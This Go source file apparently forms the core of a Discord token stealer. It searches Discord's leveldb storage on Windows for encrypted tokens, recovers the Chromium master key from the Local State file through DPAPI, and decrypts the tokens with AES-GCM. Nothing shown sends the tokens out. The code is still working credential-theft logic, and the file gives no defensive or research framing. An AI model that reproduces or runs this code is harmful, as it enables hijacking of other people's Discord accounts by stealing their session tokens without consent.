package discord

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"log"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"runtime"

	"github.com/billgraziano/dpapi"
	"github.com/tidwall/gjson"
)

// Define regex search pattern to find encrypted Discord tokens
const regexPattern = `dQw4w9WgXcQ:([^\"]*)`

// Get the folder path to where Discord stores its data
var appdataDir = filepath.ToSlash(os.Getenv("APPDATA"))

// This function gets all possible file paths that may contain encrypted Discord tokens.
// Outputs are a slice of strings containing the file paths and an error if encountered.
func GetDiscordTokenFiles() (filePaths []string, err error) {
	// Get all files in Discord's "leveldb" folder
	leveldbDir := path.Join(appdataDir, "discord", "Local Storage", "leveldb")
	tokenDirFiles, err := os.ReadDir(leveldbDir)
	if err != nil {
		return nil, err
	}

	// Get all the files in that directory that have an extension of ".ldb" or ".log"
	for _, file := range tokenDirFiles {
		fileExtension := filepath.Ext(file.Name())
		if fileExtension == ".ldb" || fileExtension == ".log" {
			fullPath := path.Join(leveldbDir, file.Name())
			filePaths = append(filePaths, fullPath)
		}
	}

	// If no errors encountered, return the list of full file paths
	return filePaths, nil
}

// This function searches Discord leveldb files for a regex pattern and returns the matches from the provided files.
// Inputs are a slice of strings representing full file paths to be searched and a regex pattern.
// Outputs are a slice of strings with the encrypted token values from the files and an error value if encountered.
func RegexSearchTokenFiles(filePaths []string, pattern string) (matches []string, err error) {
	// Compile the regular expression pattern
	regex, err := regexp.Compile(pattern)
	if err != nil {
		return nil, err
	}

	// Loop through each file path
	for _, filePath := range filePaths {
		// Open the file
		file, err := os.Open(filePath)
		if err != nil {
			return nil, err
		}
		defer file.Close()

		// Read the file line by line
		scanner := bufio.NewScanner(file)
		// Increase the buffer size of the scanner. Max size of file in Discord leveldb folder
		// I've seen has been 2MB, but I don't care about being super efficient at this scale
		const maxScanTokenSize = 5 * 1024 * 1024 // 5 MB
		buf := make([]byte, maxScanTokenSize)
		scanner.Buffer(buf, maxScanTokenSize)

		// Scan each line
		for scanner.Scan() {
			line := scanner.Text()

			// Find submatches in the current line. This means we get just the encrypted token value, not including the `dQw4w9WgXcQ:` prefix.
			// Since our regex contains the literal sequence for the prefix and a pattern for the rest of the token, this function returns
			// a slice of strings like []string{"dQw4w9WgXcQ:djEw...", "djEw..."} where "djEw..." is the encrypted token value. I wonder if it
			// might be more efficient to get the regex pattern and then just split the string based on the prefix, but this works so whatever
			submatches := regex.FindStringSubmatch(line)
			if len(submatches) > 1 && submatches[1] != "" {
				// If submatches are found and the match is not empty, add it to the result.
				// Basically we want our output from this function to not contain an empty string
				// if it searches a file and doesn't find any matches for the regex pattern
				matches = append(matches, submatches[1])
			}
		}

		// Check for any errors encountered during scanning
		if err := scanner.Err(); err != nil {
			return nil, err
		}
	}

	// If no errors encountered, return the list of encrypted token values
	return matches, nil
}

// This function gets the encryption key for data encrypted with Chromium v80 and up.
// Input is the path of the Local State file where the encryption key is.
// Outputs are the decrypted key and an error value if encountered.
func GetDecryptionKey(stateFilePath string) (decryptionKey []byte, err error) {
	// Read the Local State file in as a byte sequence
	stateFileBytes, err := os.ReadFile(stateFilePath)
	if err != nil {
		return nil, err
	}

	// Parse out the encrypted value of the decryption key
	b64EncodedKey := gjson.Get(string(stateFileBytes), "os_crypt.encrypted_key")
	if err != nil {
		return nil, err
	}

	// Base64 decode the decryption key
	encryptedKey, err := base64.StdEncoding.DecodeString(b64EncodedKey.String())
	if err != nil {
		return nil, err
	}

	// Decrypt the decryption key. We skip the first 5 bytes of this sequence
	// because once the key has been Base64 decoded, the byte sequence starts
	// with "DPAPI" then the rest is the encrypted payload.
	masterKey, err := dpapi.DecryptBytes(encryptedKey[5:])
	if err != nil {
		return nil, err
	}

	// If no errors encountered, return the decryption key
	return masterKey, nil
}

// This function decodes and decrypts Discord tokens.
// Inputs are a string representing the text found in the leveldb file in Discord storage (not including the `dQw4w9WgXcQ:` prefix)
// and the decrypted value of the "os_crypt.encrypted_key" JSON key from the Local State file.
// Outputs are the decrypted token value and an error value if encountered.
func DecryptDiscordToken(b64EncodedToken string, decryptionKey []byte) (decryptedToken string, err error) {
	// The encrypted token value is Base64 encoded, so decode it. Now it's just AES-GCM encrypted
	encryptedTokenValue, err := base64.StdEncoding.DecodeString(b64EncodedToken)
	if err != nil {
		return "", err
	}

	// As of Chromium version 80, the token value starts with a version tag like "v10", so we skip the first three bytes.
	// The next 12 bytes after that are the cryptographic nonce, and the rest of it is the encrypted payload
	nonce := encryptedTokenValue[3:15]
	encryptedPayload := encryptedTokenValue[15:]

	// Create new AES cipher with the DPAPI-decrypted encryption key
	// from the Local State file and decrypt the token value
	block, err := aes.NewCipher(decryptionKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decryptedBytes, err := gcm.Open(nil, nonce, encryptedPayload, nil)
	if err != nil {
		return "", err
	}
	return string(decryptedBytes), nil
}

// Make sure we're running on Windows
func init() {
	os := runtime.GOOS
	if os != "windows" {
		log.Fatal("Only works on Windows right now - sorry!")
	}
}
